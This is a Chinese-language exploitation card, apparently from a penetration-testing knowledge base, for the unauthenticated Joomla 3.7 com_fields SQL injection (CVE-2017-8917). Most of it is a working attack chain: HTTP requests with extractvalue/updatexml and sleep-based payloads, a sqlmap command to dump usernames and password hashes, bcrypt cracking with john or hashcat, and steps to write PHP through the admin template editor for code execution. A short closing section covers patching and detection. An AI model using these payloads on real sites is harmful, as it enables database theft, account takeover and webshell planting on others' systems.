---
id: web-php-framework-joomla-com-fields-fullordering-unauth-sqli
title: Joomla 3.7 com_fields 未授权 SQL 注入：list[fullordering] 直接拼进 ORDER BY，用 extractvalue/updatexml 报错注入取 users 表哈希再爆破进后台
type: scenario
domain: web
path: web/php/framework
technique: joomla-com-fields-fullordering-unauth-sqli
tags:
- php
- joomla
- sqli
- cms
- error-based
- unauth
- hash-cracking
- web
cve:
- CVE-2017-8917
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:29:41+08:00'
  notes: 已对照原文核对；本次核对未读取图片；端点 index.php?option=com_fields&view=fields&layout=modal、注入参数 list[fullordering]、extractvalue/updatexml 报错注入、sqlmap 取 joomladb.#__users 的 username/password、john 破 \\$ 哈希后进后台，与原文命令逐条一致；原文 tips 明写该注入为 CVE-2017-8917，已在核对时补入 cve 字段；未验证点：目标仅能确认为 3.7，卡内 3.7.x 区间属该 CVE 的通用范围，未用原文直接证明
url: /docs/web/php/framework/web-php-framework-joomla-com-fields-fullordering-unauth-sqli/
draft: false
kb_aliases:
- Joomla com_fields SQL 注入
- list[fullordering] 注入
- Joomla 3.7 未授权注入
- com_fields view=fields layout=modal
- 报错注入取 Joomla 管理员哈希
---

## 一句话结论

Joomla 3.7.x 的 `com_fields` 组件在 `view=fields&layout=modal` 视图里，把请求参数 `list[fullordering]` 当成「排序字段名」直接拼进 `ORDER BY`，既没有 `(int)` 转换也没有白名单校验，而且该视图不要求登录；于是未授权攻击者用 `?option=com_fields&view=fields&layout=modal&list[fullordering]=<payload>` 即可注入，用 `extractvalue`/`updatexml` 报错把 `#__users` 的 `username/password` 一行行吐出来，再用 john 爆破 `$2y$` 哈希登录后台。

## 原理

- `com_fields` 是 Joomla 3.7 引入的自定义字段组件；后台「字段管理」页的列表用 `layout=modal` 渲染成一个可选字段弹窗，供其他组件嵌套调用。因为要「被任何后台页面嵌入」，它把权限检查放宽成 `core.manage` 之外的可访问状态，实测未登录也能直接命中该视图。
- 列表的排序由 `list[fullordering]` 决定：`JModelList::getListQuery()` 会读取 `$this->getState('list.fullordering')`，在没有 `filter_order`/`filter_order_Dir` 拆分的情况下，直接把它当整段 `ORDER BY` 内容拼进 SQL（`... ORDER BY " . $order . "`）。注入点因此是「ORDER BY 后的表达式」，不是值位置。
- 因为注入在 `ORDER BY`，`UNION` 不可用（列数与位置受限），但**报错注入可用**：`extractvalue(1, concat(0x7e, (子查询), 0x7e))` 会在 XPath 解析失败时把 `concat` 的结果写进 `XPATH syntax error: '...'`，从而稳定回显一列数据；`updatexml` 同理。用 `LIMIT n,1` 逐行遍历即可读完整张表。
- 关键前置信息是表前缀：Joomla 默认 `#__` → `jos_`，但安装时可改（本题为 `joomladb` 库下的其他前缀）。先注出 `database()` 与 `information_schema.tables` 里的表名，再确定 `users` 表的真实名字。
- 拿到的 `password` 是 bcrypt（`$2y$10$...`），不可逆；但 phpMyAdmin 时代的弱口令字典通常能覆盖，`john --format=bcrypt`（或 `phpass`/`bcrypt` 插件）离线爆破即可。拿到明文后登录后台，再借 `com_templates` 的模板编辑器写 PHP 即 RCE（另有卡片覆盖该后段）。

## 触发条件

- Joomla 3.7.0–3.7.x（`com_fields` 已引入、该注入未修复的版本区间）。
- Web 站点暴露 `/index.php`，`com_fields` 组件未被卸载/禁用。
- 数据库用户对 `information_schema` 有读权限（默认有），报错信息能回显到 HTTP 响应（默认 `display_errors` 视配置，报错注入也可用时间盲注兜底）。
- 需要拿到后台会话时，管理员哈希可被字典爆破（弱口令）。

## 利用步骤

1. 确认版本与组件：访问 `/administrator/manifests/files/joomla.xml` 或首页 `generator` meta 取版本；直接请求 `?option=com_fields&view=fields&layout=modal&list[fullordering]=1` 看是否 200 且不跳登录。
2. 探注入：`list[fullordering]=1` 与 `list[fullordering]=1,1` 或 `1 AND 1=1` 的响应差异/报错差异；ORDER BY 位可用 `1,(select 1)` 之类试探。
3. 报错注入取库名：`extractvalue(1,concat(0x7e,database(),0x7e))`。
4. 取表名：`extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))`，逐个 `limit n,1` 遍历。
5. 取 `users` 表字段：`select column_name from information_schema.columns where table_name=0x... limit n,1`；再取 `username`、`password`。
6. 用 sqlmap 加速（`-p "list[fullordering]"`、`--risk=3`），逐库逐表 `--dump`，注意不要用 `--batch` 一次性全自动选择（交互项会报错）。
7. 把哈希存成一行文件，`john --format=bcrypt hash.txt` 爆破；或用 `phpass`/`hashcat -m 3200`。
8. 登录 `/administrator`，进「模板 → 模板管理 → 新建文件」写 PHP，或直接改已有模板文件，访问对应 URL 执行。

## PoC

最小探测：

```http
GET /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1 HTTP/1.1
Host: <target>
```

报错注入读库名：

```http
GET /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(1,concat(0x7e,database(),0x7e)) HTTP/1.1
Host: <target>
```

读表名（`limit 0,1` 逐条遍历）：

```http
GET /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),0x7e)) HTTP/1.1
Host: <target>
```

`updatexml` 等价写法（长度上限 32 字节，读长字段需 `substr` 分段）：

```http
GET /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(2,concat(0x3a,(select%20concat(username,0x3a,password)%20from%20<prefix>users%20limit%200,1),0x3a),1) HTTP/1.1
Host: <target>
```

sqlmap 加速：

```bash
sqlmap -u "http://<target>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
       --risk=3 -p "list[fullordering]" --random-agent \
       -D <db> --tables -T "#__users" --columns -C "username,password" --dump
john --format=bcrypt hash.txt
```

说明：仅给出请求形态与命令模板，未对任何目标执行；前缀/库名/表名需按上一步枚举结果替换。

## 变体与关联

- 报错注入被 `display_errors=Off` 关闭时，改时间盲注：`list[fullordering]=(select 1 from (select sleep(if(<cond>,3,0)))a)`，或 `IF(SUBSTR(...)=...,SLEEP(3),0)`。
- 同样的 `list[fullordering]` 拼接模式在其他 Joomla 组件也存在（`com_content`、`com_users` 的部分列表视图），只是多要求登录；拿到底权账号后可继续打。
- 拿到管理员后的落地：`com_templates` 模板编辑器写 `cmd.php`（见 [[web-php-rce-joomla-admin-template-editor-webshell]]）；或直接改数据库把哈希换成已知值（见 [[web-php-joomla-db-root-reset-admin-password-hash]]）。
- 与 Joomla 4 的 `CVE-2023-23752`（`/api/index.php/v1/config/application?public=true` 泄露库口令）区分：那条是配置泄露，不需要注入即可直连数据库。
- 关联：[[web-generic-sqli-error-based-extraction]]（`extractvalue`/`updatexml` 报错注入的通用原理与长度限制）、[[web-generic-sqli-information-schema-bypass]]（过滤 `information_schema` 时的替代表）。

## 检测与防御

- 升级 Joomla 到修复版本（3.7.1 及以上）；不使用 `com_fields` 时直接禁用组件。
- 修复层面：`ORDER BY` 的字段名必须走白名单映射（`in_array($order, ['a','b'], true)`），不能把请求参数当 SQL 片段拼接。
- 检测：请求出现 `option=com_fields` 且 `list[fullordering]` 含 `extractvalue`、`updatexml`、`select`、`sleep`、`information_schema`、括号与逗号等非字段名内容；数据库错误日志里出现 `XPATH syntax error`；同一 IP 高频枚举 `limit n,1`。
- 加固：生产环境关闭 `display_errors`，Web 应用数据库账号只授予业务库权限（虽不能防此注入，但能限制 `information_schema` 之外的横向读取）。
